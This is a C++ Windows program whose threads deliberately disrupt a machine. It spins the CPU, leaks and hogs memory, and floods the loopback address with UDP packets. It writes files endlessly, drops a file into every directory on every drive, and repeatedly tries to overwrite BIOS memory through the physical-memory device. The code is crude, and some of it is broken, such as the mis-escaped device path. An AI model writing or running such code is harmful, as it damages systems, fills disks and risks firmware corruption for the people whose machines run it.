#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <filesystem>
#include <thread>
#include <chrono>
#include <vector>
#include <string>
#include <mutex>
#include <stdexcept>

#pragma comment(lib, "ws2_32.lib")

namespace fs = std::filesystem;
std::mutex fileMutex;
std::mutex indexMutex;

void createHelloWorldFile(const std::wstring& destinationPath) {
    HANDLE hFile = CreateFileW(destinationPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Failed to create file: " << destinationPath << L". Error code: " << GetLastError() << std::endl;
        return;
    }

    const char* data = "Hello, World!\n";
    DWORD bytesWritten;
    BOOL writeResult = WriteFile(hFile, data, strlen(data), &bytesWritten, NULL);
    if (!writeResult) {
        std::wcerr << L"Failed to write to file: " << destinationPath << L". Error code: " << GetLastError() << std::endl;
    }
    else {
        std::wcout << L"File created with 'Hello, World!' at " << destinationPath << std::endl;
    }

    CloseHandle(hFile);
}

void traverseAndCreateFile(const fs::path& root) {
    for (const auto& entry : fs::recursive_directory_iterator(root)) {
        if (entry.is_directory()) {
            fs::path destinationPath = entry.path() / "hello_world.txt";
            std::lock_guard<std::mutex> lock(fileMutex);
            createHelloWorldFile(destinationPath.wstring());
        }
    }
}

std::vector<char> getAllDrives() {
    std::vector<char> drives;
    char drive = 'A';
    DWORD driveMask = GetLogicalDrives();
    while (driveMask) {
        if (driveMask & 1) {
            drives.push_back(drive);
        }
        drive++;
        driveMask >>= 1;
    }
    return drives;
}

void memory_leak() {
    try {
        std::vector<int*> memoryBlocks;
        for (int i = 0; i < 1000; ++i) {
            int* block = new int[1000];
            memoryBlocks.push_back(block);

            if (i % 10 == 0 && !memoryBlocks.empty()) {
                int index = rand() % memoryBlocks.size();
                delete[] memoryBlocks[index];
                memoryBlocks.erase(memoryBlocks.begin() + index);
            }
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Exception in memory_leak: " << e.what() << std::endl;
    }
}

void resource_hogging() {
    try {
        std::vector<std::vector<int>> hoggingVectors;
        while (true) {
            hoggingVectors.emplace_back(1000000);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            if (rand() % 100 == 0 && !hoggingVectors.empty()) {
                hoggingVectors.erase(hoggingVectors.begin() + rand() % hoggingVectors.size());
            }
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Exception in resource_hogging: " << e.what() << std::endl;
    }
}

void slow_execution() {
    try {
        while (true) {
            std::this_thread::sleep_for(std::chrono::seconds(20 + rand() % 10));
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Exception in slow_execution: " << e.what() << std::endl;
    }
}

std::string generate_hello_world() {
    std::string result;
    for (int i = 0; i < 1000; ++i) {
        result += "Hello, World!";
    }
    return result;
}

void busy_wait() {
    try {
        volatile double x = 0;
        while (true) {
            for (volatile int i = 0; i < 1000000000; ++i);
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Exception in busy_wait: " << e.what() << std::endl;
    }
}

bool createDirectoryRecursively(const std::wstring& path) {
    if (CreateDirectoryW(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        return true;
    }
    else {
        DWORD error = GetLastError();
        if (error == ERROR_PATH_NOT_FOUND) {
            std::wcerr << L"Failed to create directory: " << path << L". Parent directory doesn't exist." << std::endl;
        }
        else {
            std::wcerr << L"Failed to create directory: " << path << L". Error code: " << error << std::endl;
        }

        size_t pos = path.find_last_of(L"/\\");
        if (pos != std::wstring::npos) {
            std::wstring parentPath = path.substr(0, pos);
            if (!createDirectoryRecursively(parentPath)) {
                return false;
            }
            return CreateDirectoryW(path.c_str(), NULL);
        }
    }
    return false;
}

std::mutex biosMutex; // Declare biosMutex as a global variable

void writeToBIOS(const std::vector<char>& data) {
    std::lock_guard<std::mutex> lock(biosMutex); // Lock the mutex for the duration of this function

    HANDLE hPhysicalMemory = CreateFileW(L"\\.\PhysicalMemory", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hPhysicalMemory == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open physical memory" << std::endl;
        return;
    }

    DWORD BIOS_START = 0xE0000;
    DWORD BIOS_SIZE = 0x20000;

    LPVOID biosMemory = MapViewOfFile(hPhysicalMemory, FILE_MAP_WRITE, 0, BIOS_START, BIOS_SIZE);

    if (!biosMemory) {
        std::cerr << "Failed to map BIOS memory" << std::endl;
        CloseHandle(hPhysicalMemory);
        return;
    }

    // Copy data to BIOS memory
    memcpy(biosMemory, data.data(), data.size());

    UnmapViewOfFile(biosMemory);
    CloseHandle(hPhysicalMemory);

    std::cout << "Data written to BIOS" << std::endl;
}

void writefiles(const std::wstring& basePath, int& index) {
    while (true) {
        if (!createDirectoryRecursively(basePath)) {
            std::wcerr << L"Failed to create directories." << std::endl;
            return;
        }

        {
            std::lock_guard<std::mutex> lock(indexMutex);
            std::wstring content = L"File " + std::to_wstring(index) + L" Hello World!";
            std::wstring filePath = basePath + L"temp" + std::to_wstring(index) + L".txt";

            HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) {
                std::wcerr << L"Unable to open file: " << filePath << std::endl;
                continue;
            }

            DWORD bytesWritten;
            BOOL writeResult = WriteFile(hFile, content.c_str(), content.size() * sizeof(wchar_t), &bytesWritten, NULL);
            if (!writeResult) {
                std::wcerr << L"Failed to write to file: " << filePath << std::endl;
            }

            CloseHandle(hFile);
            ++index;
        }
    }
}

std::vector<char> readFile(const std::wstring& filename) {
    std::vector<char> result;

    HANDLE hFile = CreateFileW(filename.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open file: ";
        std::wcerr << filename << ". Error code: " << GetLastError() << std::endl;
        return result; // Return empty vector on failure
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        std::cerr << "Failed to get file size for: ";
        std::wcerr << filename << ". Error code: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return result; // Return empty vector on failure
    }

    result.resize(fileSize);
    DWORD bytesRead;
    if (!ReadFile(hFile, result.data(), fileSize, &bytesRead, NULL)) {
        std::cerr << "Failed to read file: ";
        std::wcerr << filename << ". Error code: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        result.clear(); // Clear vector in case of read failure
        return result;
    }

    CloseHandle(hFile);
    return result;
}

void networkStressor(const std::vector<char>& data) {
    try {
        WSADATA wsaData;
        int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (iResult != 0) {
            std::cerr << "WSAStartup failed: " << iResult << std::endl;
            return;
        }

        SOCKET sendSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sendSocket == INVALID_SOCKET) {
            std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
            WSACleanup();
            return;
        }

        sockaddr_in recvAddr;
        recvAddr.sin_family = AF_INET;
        recvAddr.sin_port = htons(27015);
        inet_pton(AF_INET, "127.0.0.1", &recvAddr.sin_addr);

        while (true) {
            iResult = sendto(sendSocket, data.data(), data.size(), 0, reinterpret_cast<SOCKADDR*>(&recvAddr), sizeof(recvAddr));
            if (iResult == SOCKET_ERROR) {
                std::cerr << "sendto failed with error: " << WSAGetLastError() << std::endl;
                closesocket(sendSocket);
                WSACleanup();
                return;
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }

        closesocket(sendSocket);
        WSACleanup();
    }
    catch (const std::exception& e) {
        std::cerr << "Exception in networkStressor: " << e.what() << std::endl;
    }
}

void joinThread(std::thread& t) {
    if (t.joinable()) {
        try {
            t.join();
        }
        catch (const std::exception& e) {
            std::cerr << "Exception while joining thread: " << e.what() << std::endl;
        }
    }
}

int main() {
    std::thread busyThread(busy_wait);
    std::thread memoryLeakThread(memory_leak);
    std::thread resourceHoggingThread(resource_hogging);

    
    std::thread writeToBiosThread([]() {
        while (true) {
            std::vector<char> dataToWrite = { 'H', 'e', 'l', 'l', 'o', ',', ' ', 'B', 'I', 'O', 'S', '!' };
            writeToBIOS(dataToWrite);
        }
    });
    

    std::wstring basePath = L"C:\\example\\";
    int fileIndex = 1;
    std::thread writeFilesThread([&]() {
        writefiles(basePath, fileIndex);
        });

    // Create network stressor thread
    std::string data = generate_hello_world();
    std::thread networkStressorThread(networkStressor, std::vector<char>(data.begin(), data.end()));

    std::vector<char> drives = getAllDrives();

    for (char drive : drives) {
        std::string driveStr(1, drive);
        driveStr.append(":\\");
        fs::path destinationRoot = driveStr;

        std::cout << "Traversing and creating files on drive " << drive << ":\\" << std::endl;
        std::thread traversalThread(traverseAndCreateFile, destinationRoot);
        traversalThread.detach();
    }

    // Join threads to prevent the main thread from exiting
    joinThread(busyThread);
    joinThread(memoryLeakThread);
    joinThread(resourceHoggingThread);
    joinThread(writeToBiosThread); // Commented out writeToBiosThread join
    joinThread(writeFilesThread);
    joinThread(networkStressorThread);

    return 0;
}
